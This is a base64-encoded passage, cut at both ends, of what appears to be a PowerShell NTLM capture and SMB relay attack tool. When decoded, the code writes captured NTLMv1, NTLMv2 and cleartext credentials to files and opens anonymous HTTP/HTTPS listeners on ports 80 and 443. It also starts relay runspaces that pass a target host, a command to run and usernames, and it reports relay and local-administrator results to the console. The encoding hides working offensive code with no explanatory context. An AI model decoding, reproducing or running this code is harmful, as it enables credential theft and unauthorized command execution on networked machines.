cXVldWVbMF18T3V0LUZpbGUgJGludmVpZ2guTlRMTXYxX291dF9maWxlIC1BcHBlbmQKICAgICAgICAgICAgICAgICRpbnZlaWdoLk5UTE12MV9maWxlX3F1ZXVlLlJlbW92ZUF0KDApCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIHdoaWxlKCRpbnZlaWdoLk5UTE12Ml9maWxlX3F1ZXVlLkNvdW50IC1ndCAwKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkaW52ZWlnaC5OVExNdjJfZmlsZV9xdWV1ZVswXXxPdXQtRmlsZSAkaW52ZWlnaC5OVExNdjJfb3V0X2ZpbGUgLUFwcGVuZAogICAgICAgICAgICAgICAgJGludmVpZ2guTlRMTXYyX2ZpbGVfcXVldWUuUmVtb3ZlQXQoMCkKICAgICAgICAgICAgfQoKICAgICAgICAgICAgd2hpbGUoJGludmVpZ2guY2xlYXJ0ZXh0X2ZpbGVfcXVldWUuQ291bnQgLWd0IDApCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRpbnZlaWdoLmNsZWFydGV4dF9maWxlX3F1ZXVlWzBdfE91dC1GaWxlICRpbnZlaWdoLmNsZWFydGV4dF9vdXRfZmlsZSAtQXBwZW5kCiAgICAgICAgICAgICAgICAkaW52ZWlnaC5jbGVhcnRleHRfZmlsZV9xdWV1ZS5SZW1vdmVBdCgwKQogICAgICAgICAgICB9CiAgICAgICAgCiAgICAgICAgfQoKICAgICAgICBTdGFydC1TbGVlcCAtbSA1CiAgICB9CgogfQoKIyBIVFRQL0hUVFBTIExpc3RlbmVyIFN0YXJ0dXAgZnVuY3Rpb24gCmZ1bmN0aW9uIEhUVFBMaXN0ZW5lcigpCnsKICAgICRpbnZlaWdoLkhUVFBfbGlzdGVuZXIgPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQuSHR0cExpc3RlbmVyCgogICAgaWYoJGludmVpZ2guSFRUUCkKICAgIHsKICAgICAgICAkaW52ZWlnaC5IVFRQX2xpc3RlbmVyLlByZWZpeGVzLkFkZCgnaHR0cDovLyo6ODAvJykKICAgIH0KCiAgICBpZigkaW52ZWlnaC5IVFRQUykKICAgIHsKICAgICAgICAkaW52ZWlnaC5IVFRQX2xpc3RlbmVyLlByZWZpeGVzLkFkZCgnaHR0cHM6Ly8qOjQ0My8nKQogICAgfQoKICAgICRpbnZlaWdoLkhUVFBfbGlzdGVuZXIuQXV0aGVudGljYXRpb25TY2hlbWVzID0gIkFub255bW91cyIgCiAgICAkaW52ZWlnaC5IVFRQX2xpc3RlbmVyLlN0YXJ0KCkKICAgICRIVFRQX3J1bnNwYWNlID0gW1J1bnNwYWNlRmFjdG9yeV06OkNyZWF0ZVJ1bnNwYWNlKCkKICAgICRIVFRQX3J1bnNwYWNlLk9wZW4oKQogICAgJEhUVFBfcnVuc3BhY2UuU2Vzc2lvblN0YXRlUHJveHkuU2V0VmFyaWFibGUoJ2ludmVpZ2gnLCRpbnZlaWdoKQogICAgJEhUVFBfcG93ZXJzaGVsbCA9IFtQb3dlclNoZWxsXTo6Q3JlYXRlKCkKICAgICRIVFRQX3Bvd2Vyc2hlbGwuUnVuc3BhY2UgPSAkSFRUUF9ydW5zcGFjZQogICAgJEhUVFBfcG93ZXJzaGVsbC5BZGRTY3JpcHQoJHNoYXJlZF9iYXNpY19mdW5jdGlvbnNfc2NyaXB0YmxvY2spID4gJG51bGwKICAgICRIVFRQX3Bvd2Vyc2hlbGwuQWRkU2NyaXB0KCRTTUJfcmVsYXlfY2hhbGxlbmdlX3NjcmlwdGJsb2NrKSA+ICRudWxsCiAgICAkSFRUUF9wb3dlcnNoZWxsLkFkZFNjcmlwdCgkU01CX3JlbGF5X3Jlc3BvbnNlX3NjcmlwdGJsb2NrKSA+ICRudWxsCiAgICAkSFRUUF9wb3dlcnNoZWxsLkFkZFNjcmlwdCgkU01CX3JlbGF5X2V4ZWN1dGVfc2NyaXB0YmxvY2spID4gJG51bGwKICAgICRIVFRQX3Bvd2Vyc2hlbGwuQWRkU2NyaXB0KCRTTUJfTlRMTV9mdW5jdGlvbnNfc2NyaXB0YmxvY2spID4gJG51bGwKICAgICRIVFRQX3Bvd2Vyc2hlbGwuQWRkU2NyaXB0KCRIVFRQX3NjcmlwdGJsb2NrKS5BZGRBcmd1bWVudCgkQ2hhbGxlbmdlKS5BZGRBcmd1bWVudCgKICAgICAgICAkU01CUmVsYXlUYXJnZXQpLkFkZEFyZ3VtZW50KCRTTUJSZWxheUNvbW1hbmQpLkFkZEFyZ3VtZW50KCRTTUJSZWxheVVzZXJuYW1lcykuQWRkQXJndW1lbnQoCiAgICAgICAgJFNNQlJlbGF5QXV0b0Rpc2FibGUpLkFkZEFyZ3VtZW50KCRTTUJSZWxheU5ldHdvcmtUaW1lb3V0KS5BZGRBcmd1bWVudCgkV1BBREF1dGgpID4gJG51bGwKICAgICRIVFRQX3Bvd2Vyc2hlbGwuQmVnaW5JbnZva2UoKSA+ICRudWxsCn0KCiMgQ29udHJvbCBSZWxheSBTdGFydHVwIGZ1bmN0aW9uCmZ1bmN0aW9uIENvbnRyb2xSZWxheUxvb3AoKQp7CiAgICAkY29udHJvbF9yZWxheV9ydW5zcGFjZSA9IFtSdW5zcGFjZUZhY3RvcnldOjpDcmVhdGVSdW5zcGFjZSgpCiAgICAkY29udHJvbF9yZWxheV9ydW5zcGFjZS5PcGVuKCkKICAgICRjb250cm9sX3JlbGF5X3J1bnNwYWNlLlNlc3Npb25TdGF0ZVByb3h5LlNldFZhcmlhYmxlKCdpbnZlaWdoJywkaW52ZWlnaCkKICAgICRjb250cm9sX3JlbGF5X3Bvd2Vyc2hlbGwgPSBbUG93ZXJTaGVsbF06OkNyZWF0ZSgpCiAgICAkY29udHJvbF9yZWxheV9wb3dlcnNoZWxsLlJ1bnNwYWNlID0gJGNvbnRyb2xfcmVsYXlfcnVuc3BhY2UKICAgICRjb250cm9sX3JlbGF5X3Bvd2Vyc2hlbGwuQWRkU2NyaXB0KCRzaGFyZWRfYmFzaWNfZnVuY3Rpb25zX3NjcmlwdGJsb2NrKSA+ICRudWxsCiAgICAkY29udHJvbF9yZWxheV9wb3dlcnNoZWxsLkFkZFNjcmlwdCgkY29udHJvbF9yZWxheV9zY3JpcHRibG9jaykuQWRkQXJndW1lbnQoJFJ1blRpbWUpID4gJG51bGwKICAgICRjb250cm9sX3JlbGF5X3Bvd2Vyc2hlbGwuQmVnaW5JbnZva2UoKSA+ICRudWxsCn0KCiMgSFRUUCBTZXJ2ZXIgU3RhcnQKaWYoJGludmVpZ2guSFRUUCAtb3IgJGludmVpZ2guSFRUUFMpCnsKICAgIEhUVFBMaXN0ZW5lcgp9CgojIENvbnRyb2wgUmVsYXkgTG9vcCBTdGFydAppZigkUnVuVGltZSAtb3IgJGludmVpZ2guZmlsZV9vdXRwdXQpCnsKICAgIENvbnRyb2xSZWxheUxvb3AKfQoKaWYoJGludmVpZ2guY29uc29sZV9vdXRwdXQpCnsKCiAgICA6Y29uc29sZV9sb29wIHdoaWxlKCRpbnZlaWdoLnJlbGF5X3J1bm5pbmcgLWFuZCAkaW52ZWlnaC5jb25zb2xlX291dHB1dCkKICAgIHsKCiAgICAgICAgd2hpbGUoJGludmVpZ2guY29uc29sZV9xdWV1ZS5Db3VudCAtZ3QgMCkKICAgICAgICB7CgogICAgICAgICAgICBpZigkaW52ZWlnaC5vdXRwdXRfc3RyZWFtX29ubHkpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFdyaXRlLU91dHB1dCgkaW52ZWlnaC5jb25zb2xlX3F1ZXVlWzBdICsgJGludmVpZ2gubmV3bGluZSkKICAgICAgICAgICAgICAgICRpbnZlaWdoLmNvbnNvbGVfcXVldWUuUmVtb3ZlQXQoMCkKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgIHsKCiAgICAgICAgICAgICAgICBzd2l0Y2ggLXdpbGRjYXJkICgkaW52ZWlnaC5jb25zb2xlX3F1ZXVlWzBdKQogICAgICAgICAgICAgICAgewoKICAgICAgICAgICAgICAgICAgICAiKiB3cml0dGVuIHRvICoiCiAgICAgICAgICAgICAgICAgICAgewoKICAgICAgICAgICAgICAgICAgICAgICAgaWYoJGludmVpZ2guZmlsZV9vdXRwdXQpCiAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgJGludmVpZ2guY29uc29sZV9xdWV1ZVswXQogICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5jb25zb2xlX3F1ZXVlLlJlbW92ZUF0KDApCiAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAiKiBmb3IgcmVsYXkgKiIKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgJGludmVpZ2guY29uc29sZV9xdWV1ZVswXQogICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5jb25zb2xlX3F1ZXVlLlJlbW92ZUF0KDApCiAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAiKlNNQiByZWxheSAqIgogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgV3JpdGUtV2FybmluZyAkaW52ZWlnaC5jb25zb2xlX3F1ZXVlWzBdCiAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmNvbnNvbGVfcXVldWUuUmVtb3ZlQXQoMCkKICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICIqIGxvY2FsIGFkbWluaXN0cmF0b3IgKiIKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgJGludmVpZ2guY29uc29sZV9xdWV1ZVswXQogICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5jb25zb2xlX3F1ZXVlLlJlbW92ZUF0KDApCiAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICBkZWZhdWx0CiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1PdXRwdXQgJGludmVpZ2guY29uc29sZV9xdWV1ZVswXQogICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5jb25zb2xlX3F1ZXVlLlJlbW92ZUF0KDApCiAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgIH0KCiAgICAgICAgfQoKICAgICAgICBpZigkaW52ZWlnaC5jb25zb2xlX2lucHV0KQogICAgICAgIHsKCiAgICAgICAgICAgIGlmKFtDb25zb2xlXTo6S2V5QXZhaWxhYmxlKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkaW52ZWlnaC5jb25zb2xlX291dHB1dCA9ICRmYWxzZQogICAgICAgICAgICAgICAgQlJFQUsgY29uc29sZV9sb29wCiAgICAgICAgICAgIH0KICAgICAgICAKICAgICAgICB9CgogICAgICAgIFN0YXJ0LVNsZWVwIC1tIDUKICAgIH0KCn0KCn0K
